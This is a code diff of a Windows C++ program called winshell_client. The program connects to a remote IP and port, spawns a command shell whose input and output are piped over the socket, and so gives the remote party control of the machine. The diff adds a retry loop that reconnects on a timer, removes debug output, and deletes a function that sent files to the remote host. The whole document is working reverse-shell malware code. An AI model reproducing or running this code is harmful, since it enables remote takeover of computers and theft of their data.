@@ -6,11 +6,17 @@
 #include <BaseTsd.h>
 #include <Windows.h>
 #include <string>
+#include <ws2tcpip.h>
 typedef SSIZE_T ssize_t;
 
 char * server_ip;
 int server_port;
+int interval;
+
+SOCKET m_socket;
+
 static const int BUFFER_SIZE = 16 * 1024;
+#define BUFSIZE 4096
 
 using std::string;
 
@@ -19,52 +25,66 @@ HANDLE g_hChildStd_OUT_Wr = NULL;
 HANDLE g_hChildStd_IN_Rd = NULL;
 HANDLE g_hChildStd_IN_Wr = NULL;
 
-#define BUFSIZE 4096
-
 void WriteToPipe(string msg);
 char* ReadFromPipe(void);
 
-int main(int argc, char ** argv){
-	if (argc < 2) {
-		printf("Usage: winshell_client [ip] [port]");
-		exit(10);
-	}
-	server_ip = argv[1];
-	server_port = atoi(argv[2]);
-	// Initialize Winsock.
+int mainLoop() {
 	WSADATA wsaData;
 	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != NO_ERROR)
-		printf("Client: Error at WSAStartup().\n");
-	else
-		printf("Client: WSAStartup() is OK.\n");
+		return 1;
 	// Create a socket.
-	SOCKET m_socket;
 	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (m_socket == INVALID_SOCKET)
-	{
-		printf("Client: socket() - Error at socket(): %ld\n", WSAGetLastError());
-		WSACleanup();
-		return 0;
-	}
-	else
-		printf("Client: socket() is OK.\n");
-	// Connect to a server.
+
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
 	// Just test using the localhost, you can try other IP address
 	clientService.sin_addr.s_addr = inet_addr(server_ip);
 	clientService.sin_port = htons(server_port);
-	if (connect(m_socket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR){
-		printf("Client: connect() - Failed to connect.\n");
-		WSACleanup();
-		return 0;
-	}
-	else{
-		printf("Client: connect() is OK.\n");
-		printf("Client: Can start sending and receiving data...\n");
+	if (connect(m_socket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
+		return 1;
 	}
 
+	// Send and receive data.
+	int bytesSent;
+	int bytesRecv = SOCKET_ERROR;
+	// Be careful with the array bound, provide some checking mechanism...
+	char sendbuf[16000] = "";
+	char recvbuf[16000] = "";
+	char inFromPipe[16000] = "";
+	int inLen = 0;
+	int prevLen = 0;
+	// Receives some test string to server...
+	while (true)
+	{
+		strcpy(sendbuf, ReadFromPipe());
+		bytesSent = send(m_socket, sendbuf, strlen(sendbuf), 0);
+
+		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
+		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
+		{
+			break;
+		}
+		if (bytesRecv < 0)
+			return 0;
+		else {
+			WriteToPipe(recvbuf);
+		}
+
+	}
+	WSACleanup();
+	return 0;
+}
+
+int main(int argc, char ** argv){
+	if (argc < 3) {
+		printf("Usage: winshell_client [ip] [port] [interval]");
+		exit(10);
+	}
+	server_ip = argv[1];
+	server_port = atoi(argv[2]);
+	interval = atoi(argv[3]);
+	
 	//BEFORE sending/recieving, open a command line session and redirect its I/O to our pipes
 	SECURITY_ATTRIBUTES saAttr;
 
@@ -112,38 +132,10 @@ int main(int argc, char ** argv){
 	CloseHandle(piProcInfo.hThread);
 	
 	//Done opening command line session
-
-	// Send and receive data.
-	int bytesSent;
-	int bytesRecv = SOCKET_ERROR;
-	// Be careful with the array bound, provide some checking mechanism...
-	char sendbuf[16000] = "";
-	char recvbuf[16000] = "";
-	char inFromPipe[16000] = "";
-	int inLen = 0;
-	int prevLen = 0;
-	// Receives some test string to server...
-	while (true)
-	{
-		printf("Executing main loop");
-		ReadFromPipe();
-		strcpy(sendbuf, ReadFromPipe());
-		bytesSent = send(m_socket, sendbuf, strlen(sendbuf), 0);
-
-		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
-		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
-		{
-			break;
-		}
-		if (bytesRecv < 0)
-			return 0;
-		else {
-			WriteToPipe(recvbuf);
-		}
-		
+	while (1) {
+		mainLoop();
+		Sleep(interval);
 	}
-	WSACleanup();
-	return 0;
 }
 
 void WriteToPipe(string msg)
@@ -161,57 +153,12 @@ char* ReadFromPipe(void)
 	CHAR oldChBuf[BUFSIZE] = "";
 	for (;;)
 	{
-		//bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
-		//if (!bSuccess || dwRead == 0) break;
 		PeekNamedPipe(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL, NULL);
-		total += dwRead;
 		if (strcmp(chBuf, oldChBuf) == 0) break;
+		total += dwRead;
 		Sleep(250);
 		strcpy(oldChBuf, chBuf);
-		//bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
-		//if (!bSuccess) break;
 	}
 	chBuf[total] = 0;
 	return chBuf;
-}
-
-static void SendFile(const char * fileName)
-{
-	FILE * fpIn = fopen(fileName, "r");
-	if (fpIn)
-	{
-		int s = socket(AF_INET, SOCK_STREAM, 0);
-		if (s >= 0)
-		{
-			struct sockaddr_in saAddr; memset(&saAddr, 0, sizeof(saAddr));
-			saAddr.sin_family = AF_INET;
-			saAddr.sin_addr.s_addr = htonl(inet_addr(server_ip));
-			saAddr.sin_port = htons(server_port);
-
-			if (connect(s, (struct sockaddr *) &saAddr, sizeof(saAddr)) == 0)
-			{
-				printf("Connected to remote host, sending file [%s]\n", fileName);
-
-				char buf[BUFFER_SIZE];
-				while (1)
-				{
-					ssize_t bytesRead = fread(buf, 1, sizeof(buf), fpIn);
-					if (bytesRead <= 0) break;  // EOF
-
-					printf("Read %i bytes from file, sending them to network...\n", (int)bytesRead);
-					if (send(s, buf, bytesRead, 0) != bytesRead)
-					{
-						perror("send");
-						break;
-					}
-				}
-			}
-			else perror("connect");
-			closesocket(s);
-		}
-		else perror("socket");
-
-		fclose(fpIn);
-	}
-	else printf("Error, couldn't open file [%s] to send!\n", fileName);
 }
